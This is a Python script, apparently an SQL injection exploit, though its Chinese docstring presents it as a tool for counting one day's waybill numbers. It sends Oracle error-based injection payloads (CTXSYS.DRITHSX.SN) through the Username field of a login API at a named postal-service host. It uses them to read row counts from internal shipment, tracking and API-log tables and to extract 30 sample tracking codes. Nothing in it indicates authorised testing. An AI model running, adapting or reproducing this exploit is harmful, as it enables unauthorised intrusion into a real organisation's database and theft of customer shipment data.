#!/usr/bin/env python3
"""
统计2025-10-10的运单号数量
"""

import requests
import json
import time

class TrackingCounter:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def count_today_tracking(self):
        """统计今天的运单号"""
        print("=" * 80)
        print("📊 统计2025-10-10的运单号数量")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("SHIPMENT表 - 总运单数", f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
            ("SHIPMENT表 - 独立运单号", f"SELECT COUNT(DISTINCT CODE) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
            ("E1E2_PH表 - 总记录数", f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            ("E1E2_PH表 - 独立MABC", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            ("JOURNEYTOKEN表 - 运单数", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}'"),
            ("API_CALL_LOG表 - 今日调用", f"SELECT COUNT(*) FROM EMS.API_CALL_LOG WHERE CREATED_AT>=TO_DATE('{date}','YYYYMMDD')"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result:>10} 条")
            time.sleep(2)
        
        # 提取样本运单号
        print(f"\n\n{'='*80}")
        print("📦 样本运单号（前30个）")
        print(f"{'='*80}")
        
        for i in range(1, 31):
            query = f"SELECT CODE FROM (SELECT DISTINCT CODE FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' ORDER BY CODE) WHERE ROWNUM={i}"
            result = self.extract_via_error(query)
            
            if result:
                print(f"{i}. {result}")
            
            time.sleep(0.3)
    
    def run(self):
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接")
            return
        print(f"✅ 连接成功\n")
        
        self.count_today_tracking()
        
        print("\n" + "=" * 80)
        print("✅ 统计完成")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    counter = TrackingCounter(target_url)
    counter.run()
